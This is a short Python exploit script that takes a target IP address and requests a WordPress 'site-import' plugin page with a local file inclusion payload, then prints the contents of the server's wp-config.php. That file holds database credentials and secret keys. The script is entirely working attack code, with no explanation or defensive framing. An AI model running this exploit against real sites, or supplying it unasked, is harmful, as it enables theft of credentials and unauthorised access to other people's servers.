#!/usr/bin/env python3
import sys
import urllib.request
import urllib.parse

def main():
    target_ip = sys.argv[1]

    url = 'http://' + target_ip + '/wordpress/wp-content/plugins/site-import/admin/page.php?url=/inetpub/wwwroot/wordpress/wp-config.php'
    lfi = urllib.request.urlopen(url)
    print(lfi.read().decode('utf-8'))
    

if __name__ == "__main__":
    if (len(sys.argv) != 2):
        print("Usage: python3 %s <target IP address>" % sys.argv[0])
        sys.exit(0)
    else:
        main()

